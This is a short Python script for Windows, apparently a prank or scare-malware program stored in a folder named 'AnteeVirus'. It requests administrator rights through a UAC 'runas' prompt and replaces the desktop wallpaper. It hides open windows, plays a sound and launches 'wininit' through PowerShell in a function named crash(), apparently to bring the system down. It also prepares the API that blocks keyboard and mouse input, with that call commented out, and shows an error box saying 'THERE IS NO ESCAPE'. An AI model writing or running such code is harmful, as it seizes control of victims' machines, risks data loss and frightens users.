import subprocess
import ctypes
import sys
import tkinter.messagebox as mb
from ctypes import wintypes
import time
import threading
import playsound
import pyautogui
import PyWallpaper
BlockInput = ctypes.windll.user32.BlockInput
BlockInput.argtypes = [wintypes.BOOL]
BlockInput.restype = wintypes.BOOL
one = True
def crash():
    playsound.playsound("b.wav")
    subprocess.call(["powershell","-Command","wininit"])

#ask for admin
ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

PyWallpaper.change_wallpaper("C:/Users/user/AnteeVirus/white.png")
pyautogui.hotkey('winleft','d')

#begin phase 1
t = threading.Thread(target=crash)
t.start()

#BlockInput(True)
mb.showerror("ur cooked","THERE IS NO ESCAPE")